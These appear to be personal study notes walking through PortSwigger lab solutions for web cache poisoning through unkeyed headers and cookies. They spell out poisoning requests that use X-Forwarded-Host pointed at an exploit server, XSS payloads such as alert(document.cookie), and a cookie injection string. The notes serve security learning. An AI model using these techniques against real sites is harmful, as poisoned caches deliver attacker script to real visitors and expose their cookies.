https://portswigger.net/web-security/web-cache-poisoning#what-is-web-cache-poisoning
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws

#### Param Miner
You can automate the process of identifying unkeyed inputs by adding the [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) extension to Burp from the BApp store. To use Param Miner, you simply right-click on a request that you want to investigate and click "Guess headers". Param Miner then runs in the background, sending requests containing different inputs from its extensive, built-in list of headers. If a request containing one of its injected inputs has an effect on the response, Param Miner logs this in Burp, either in the "Issues" pane if you are using Burp Suite Professional, or in the "Output" tab of the extension ("Extensions" > "Installed" > "Param Miner" > "Output") if you are using Burp Suite Community Edition.

For example, in the following screenshot, Param Miner found an unkeyed header `X-Forwarded-Host` on the home page of the website:

![](Pasted%20image%2020241103040921.png)

**Caution:** When testing for unkeyed inputs on a live website, there is a risk of inadvertently causing the cache to serve your generated responses to real users. Therefore, it is important to make sure that your requests all have a unique cache key so that they will only be served to you. To do this, you can manually add a cache buster (such as a unique parameter) to the request line each time you make a request. Alternatively, if you are using Param Miner, there are options for automatically adding a cache buster to every request.


# 1.  Web cache poisoning with an unkeyed header
This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

1. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the `GET` request for the home page and send it to Burp Repeater.
2. Add a cache-buster query parameter, such as `?cb=1234`.
3. Add the `X-Forwarded-Host` header with an arbitrary hostname, such as `example.com`, and send the request.
4. Observe that the `X-Forwarded-Host` header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at `/resources/js/tracking.js`.
5. Replay the request and observe that the response contains the header `X-Cache: hit`. This tells us that the response came from the cache.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response:
    `/resources/js/tracking.js`
7. In the body, enter the payload `alert(document.cookie)` and store the exploit.
8. Open the `GET` request for the home page in Burp Repeater and remove the cache buster.
9. Add the following header, remembering to enter your own exploit server ID:
    `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
10. Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and `X-Cache: hit` in the headers.
11. To simulate the victim, load the poisoned URL in the browser and make sure that the `alert()` is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds.
12. If the lab is still not solved, the victim did not access the page while the cache was poisoned. Keep sending the request every few seconds to re-poison the cache until the victim is affected and the lab is solved.

Analysis:
![](Pasted%20image%2020241103052909.png)

![](Pasted%20image%2020241103053102.png)

store the exploit on a server and deliver trough X-Forward-Host header:
![](Pasted%20image%2020241103053433.png)

![](Pasted%20image%2020241103053657.png)

send the request until the payload is finally cached by the server ( hit )


# 2.Web cache poisoning with an unkeyed cookie
This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(1)` in the visitor's browser.

1. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Notice that the first response you received sets the cookie `fehost=prod-cache-01`.
2. Reload the home page and observe that the value from the `fehost` cookie is reflected inside a double-quoted JavaScript object in the response.
3. Send this request to Burp Repeater and add a cache-buster query parameter.
4. Change the value of the cookie to an arbitrary string and resend the request. Confirm that this string is reflected in the response.
5. Place a suitable XSS payload in the `fehost` cookie, for example:
    `fehost=someString"-alert(1)-"someString`
6. Replay the request until you see the payload in the response and `X-Cache: hit` in the headers.
7. Load the URL in the browser and confirm the `alert()` fires.
8. Go back Burp Repeater, remove the cache buster, and replay the request to keep the cache poisoned until the victim visits the site and the lab is solved.

Analysis:

- cookie `fehost=prod-cache-01`.![](Pasted%20image%2020241104012549.png)
  - value of the `fehost` is now reflected in  response![](Pasted%20image%2020241104013750.png)
  - testing for reflection ![](Pasted%20image%2020241104013931.png)
  ![](Pasted%20image%2020241104014131.png)

# 3.  Web cache poisoning with multiple headers
This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

1. Go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the `GET` request for the JavaScript file `/resources/js/tracking.js` and send it to Burp Repeater.
2. Add a cache-buster query parameter and the `X-Forwarded-Host` header with an arbitrary hostname, such as `example.com`. Notice that this doesn't seem to have any effect on the response.
3. Remove the `X-Forwarded-Host` header and add the `X-Forwarded-Scheme` header instead. Notice that if you include any value other than `HTTPS`, you receive a 302 response. The `Location` header shows that you are being redirected to the same URL that you requested, but using `https://`.
4. Add the `X-Forwarded-Host: example.com` header back to the request, but keep `X-Forwarded-Scheme: nothttps` as well. Send this request and notice that the `Location` header of the 302 redirect now points to `https://example.com/`.
5. Go to the exploit server and change the file name to match the path used by the vulnerable response:
    `/resources/js/tracking.js`
6. In the body, enter the payload `alert(document.cookie)` and store the exploit.
7. Go back to the request in Burp Repeater and set the `X-Forwarded-Host` header as follows, remembering to enter your own exploit server ID:
    `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
8. Make sure the `X-Forwarded-Scheme` header is set to anything other than `HTTPS`.
9. Send the request until you see your exploit server URL reflected in the response and `X-Cache: hit` in the headers.
10. To check that the response was cached correctly, right-click on the request in Burp, select "Copy URL", and load this URL in Burp's browser. If the cache was successfully poisoned, you will see the script containing your payload, `alert(document.cookie)`. Note that the `alert()` won't actually execute here.
11. Go back to Burp Repeater, remove the cache buster, and resend the request until you poison the cache again.
12. To simulate the victim, reload the home page in the browser and make sure that the `alert()` fires.
13. Keep replaying the request to keep the cache poisoned until the victim visits the site and the lab is solved.

- adding a cachebuster param
	![](Pasted%20image%2020241104021240.png)
- quick headers scan using Param Miner burp extension and we observe that `X-Forwarded-Scheme` header is unkeyed
	![](Pasted%20image%2020241104021527.png)
- https scheme --> 200 response (no backserver redirect) so we have to use a nonhttps scheme
	![](Pasted%20image%2020241104022652.png)

	![](Pasted%20image%2020241104022736.png)
- scanning again using Param Miner
	![](Pasted%20image%2020241104022921.png)![](Pasted%20image%2020241104023250.png)![](Pasted%20image%2020241104023333.png)
- craft the exploit using our exploiting server with the poisoned cache
	![](Pasted%20image%2020241104023529.png)